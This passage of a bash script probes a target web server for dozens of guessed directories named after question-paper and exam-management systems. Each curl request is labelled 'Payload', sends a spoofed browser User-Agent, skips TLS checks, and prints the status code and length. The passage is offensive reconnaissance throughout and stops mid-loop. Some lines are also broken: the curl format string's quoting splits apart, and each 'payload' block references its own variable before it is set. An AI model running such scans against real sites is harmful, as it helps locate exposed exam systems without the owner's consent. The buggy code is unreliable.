         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
